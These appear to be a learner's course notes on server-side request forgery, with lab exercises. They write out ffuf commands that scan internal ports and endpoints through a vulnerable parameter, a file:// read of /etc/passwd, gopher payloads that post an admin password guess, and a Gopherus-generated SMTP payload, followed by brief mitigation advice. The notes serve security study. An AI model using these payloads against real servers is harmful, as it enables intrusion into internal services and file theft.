# Intro to SSRF:
- Server-side Request forgery:
Suppose a web server fetches remotes resources based on user input. An Attacker might be able to coerece the server into making request to arbitrary URLs supplied by the attackers.
The web server is vulnerable to SSRF, while this might not sound partriculary bad at first, Depending on the web app configuration, SSRF vulnerabilities
can have desvasting consequences, as we will see in the upcomping sections.
If The web app relies on a user-supplied URL scheme or protocol, an attacker might be able to cuase even fruther undersired behaviopr by manipulating the URL scheme.
    - http::// and https:// : These URL schemes fetches content via HTPP/s request. An attacker muight use this in the explotation of SSRF vulnerabilities to bypass WAFs, access restricted
    enpoints, or access enpoints in the internal network.
    - File:// This URL scheme reads a file form the local file system, An attacker might use this in the explotation of SSRF vulnerabilities to read local files on the web server(LFI).
    - gopher:// This protocol can send arbitrary bytes to the specified address, an attackers might use this is the explotation of SSRF vulnerabilities to send HTTP POST requests with arbitrary
    payloads or communicate with other service such as SMTP server or db.


# Idetifying SSFR:
Confirming SSRF: Looking at the web app, we are greeted with some generivcc text as well as funtionality to schedule appointment, after that we check the date. AS we can see, the request contains
our chosen data and URL in the parameter dateserver. This indicates that the web server fetches the avaliability information form a separate system determined by the URL passed in this POST parameter.
To confirm as SSRF vulnerability, a URL pointing to our system to the web app:
In a netcat listener, we can reiceve a connection, thus confirming SSRF:
`nc -lnvp port`

To Determine whether the HTTP response reflects the SSRF reponse to us, let us point the web app to itself by providing the URL http://127.0.0.1/index.php.
- Enumerating SYstems:
We can use thge SSRF vulnerability to conduct a port scan of the system to enumerate running services. We need to be able to infer whether a port  is open or not from the response to our SSRF payload.
Supply a port that we assume is clode as 81, the response contains an error message.
This enable us to conduct an internal port scan of the web server through th SSRF vulnerability. We can do this using fuzzer like fuff, Lest create a wordlist and scan the ports:
`seq 1 10000 > ports.txt`
Then use the message:
`ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"`

The results show that the web server runt on the port 3306 typically use for SQL database. If the web server ran other inernal services, we could also identify and access them through the SSRF vulnerability.

Exercise:
1. Create the wordlist for scan the ports:
2. Fuzz for see the port of the web:
`ffuf -w port.txt -u http://10.129.83.223/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"`
Then we can get this ports:
80
3360
8000
After that we can paste in burp:
dateserver=http://127.0.0.1:8000&date=2024-01-01
Get the flag :)

# Exoploiting SSRF:
- Accessing Restricted Enpoints:
As we have seen, the web app fetches avaliability information form the URL dataserver.htb, when we add this domain to our hosts file an attempts to access it, we are usable to do so:
We can access adn enumerate the domian though the SSRF vulnerability, WE can conduct a dic brute force attacks to enumere additional endpoints using ffuf.
Firt we must to determinate the web server's response when we access a non-existing page:
As we can see, the Web server reponsds with the def apache 404 response, to alsop filter out any HTTP 403 responses, we wll filter out results based on the strin Server at dataserver.htb Port 80, which
contained in def Apache error pages:
`ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"`

We have successfuslly identified an additional internal enpoint that we can now access through the SSRF vulnerability by specifying the URL in the date server Post parameter to potentially sensitive admin info.

- Local FIle Inclusion(LFI):
As seen a few section ago we can manipulate the URL scheme to provoke further unexpected behavior, since the URL scheme is parto of the URL supplied to teh web app, let us attempt to read local file form the file system using
[file://] URL scheme. We can archieve this by supportiung the [file://etc/passwd]

- The gopher protocol:
As we ca seen, we ca use SSRF to access restricted internal endpoints, we are restricted to GET requests as there is no way to send a POST request with the http://. Let us to consider different verison of the web app.
Assuming we identified the internal endpoint /admin.php just like before, this time the response looks like this.
As we can see the admin endpoint is protected by a longin prompt. From thw HTML form, we can deduce that we need to send a POST request to /admin.php containing the password in the adminpw POST parameter. There is no way
to send this POST request using the http:// URL scheme.

We can use the [gopher](https://datatracker.ietf.org/doc/html/rfc1436) URL scheme to send arbitrary bytes to TCP sockects. This protocol enables us to create a POST request by building the HTTP request ourselves/
Assuming we want to try common weak pass such as admin we can send the following POSt request:
```http
POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```
We need to URL-encode all special character to contruct a valid URL from this. Spaces[%20] and newlines must be URL-encoded. We need to prefix the data with gospher URL schem, the target host and port, and underscore, resulting
in the following gopher URL:
`gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin`
Our specified bytes are snet to target when teh we app precess this URL, since we carefully chose the bytes to represent a valid POST request, the internal web server accepts our POST request and responds accordingly, Since we are
sending oir URL with the HTTP POST parameter dateserver, whcih itself is URL-encode, we need to URL encode the entire URl again ensure the correct format
of the URL after the web server accepts
```js

POST /index.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 265
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
```
We can use the goher protocol to interact with many internal services, not just HTTP servers. Imagine a scenario where identify, though an SSRF vulnerability, that TCP port 25 is open locally. This is teh standard port for SMTP server.
We can use Gopher to interact with this internal SMTP server as well. Constructing syntactially and sematically correct gopher URLs can take
tiem and effort. Gospherus support:
- MySQL
- PostgreSQL
- FastCGI
- Redis
- SMTP
- Zabbix
- pymemcache
- rbmemcache
- phpmemcache
- dmpmemcache

For run the tool we nee valid Python2. and we can  run the gopherus.
```sh
Give Details to send mail:

Mail from :  attacker@academy.htb
Mail To :  victim@academy.htb
Subject :  HelloWorld
Message :  Hello from SSRF!

Your gopher link is ready to send Mail:

gopher://127.0.0.1:25/_MAIL%20FROM:attacker%40academy.htb%0ARCPT%20To:victim%40academy.htb%0ADATA%0AFrom:attacker%40academy.htb%0ASubject:HelloWorld%0AMessage:Hello%20from%20SSRF%21%0A.

-----------Made-by-SpyD3r-----------
```

Exercise:
Attack with gophous:
gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin

# Blind SSRF:
In many real-word: SSRF vulnerabilities, the response is not directly displayed, These instance are called blind SSRF vulnerabilities cause  we cannot see the reponse, all the explotation vectors discussed in the previus section are unaviable
to us cause they all rely on us begin able to inspect the response.
- identifying Blind SSRF:
The sample web app behaves just like in the previus section. We can confirm the SSRF vulnerability just like we did before by supplying a URL to a system under our control and setting up a netcat.
- explotation Blind SSRF:
Is generraly severely limited compared to non-blind SSRF vulnerabilities. Depending on the web app behavior, we might be able top conduct a restricted local port scan of the system, provide
the response differs for open and close ports. The web app responsds with SOmethion wen wrong for close ports:
Depending on how the web app catches unexpected errors, we might be unable to identify running services that fo not reponds with valid HTTP responses, We are unable to identify the running MySql service using this tech.

While we cannot read local file like before, we can use the same tech to identify existing files on the filesystem. that is cause the error message is diff for existing and non-existing files, just like it
differs for open and close ports

Exercise:
Exploit the SSRF to identify open ports on the system. Which port is open in addition to port 80?
First we must to put in the 80 port and see what is the text and and use fuzz for search the port:
```sh
ffuf -w Dictionaries/SecLists/Discovery/Infrastructure/common-http-ports.txt  -u http://10.129.63.211/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Something"


        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.129.63.211/index.php
 :: Wordlist         : FUZZ: /home/Anchovy/Dictionaries/SecLists/Discovery/Infrastructure/common-http-ports.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Something
________________________________________________

5000                    [Status: 200, Size: 52, Words: 8, Lines: 1, Duration: 127ms]
80                      [Status: 200, Size: 52, Words: 8, Lines: 1, Duration: 199ms]
```
And try with see and is the same message:
Date is unavailable. Please choose a different date! other port open

# Preventing the SSFR:
Mitigations and contermeasures against SSRF vulnerabilities can be implemented at the web app or network layers, if the web app fetches data form a remote host based on use input, proper
security measure to prevent scenarios are crucial.
The remote data us fetched form should be cheked against a whitlelist to prevent attacks to coecering the server to make requests against arbitrary origins. A whitelist prevents an attackers form making
unintended requests to internal syste,

